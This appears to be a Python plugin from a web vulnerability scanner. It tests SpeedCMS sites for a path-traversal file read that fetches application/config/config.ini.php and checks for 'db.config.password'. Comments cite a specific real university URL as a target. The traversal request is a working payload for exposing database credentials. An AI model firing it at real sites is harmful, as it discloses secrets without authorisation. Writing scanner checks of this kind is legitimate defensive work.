#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    #http://eec.scu.edu.cn/article/file/cid/1136/?file=../../../application/config/config.ini.php
    list = []
    try:
        domain = ob['domain']
        detail = ''
  
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url+="article/file/cid/1136/?file=../../../../application/config/config.ini.php"

        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if content.find('db.config.password')>=0 or content.find('<script>alert(\'您欲查看的文件不存在！\');</script><script>window.close();</script>')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
            if ob['isstart']=='1':
                detail="验证性扫描结果：\n%s"%content
    except Exception,e:
        logging.getLogger().error("File:speedcmsreadfilescript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:speedcmsreadfilescript.py, run_domain function :" + str(e))
    #end try
    
    return list

#http://eec.scu.edu.cn/article/file/cid/1136/?file=../../../application/config/config.ini.php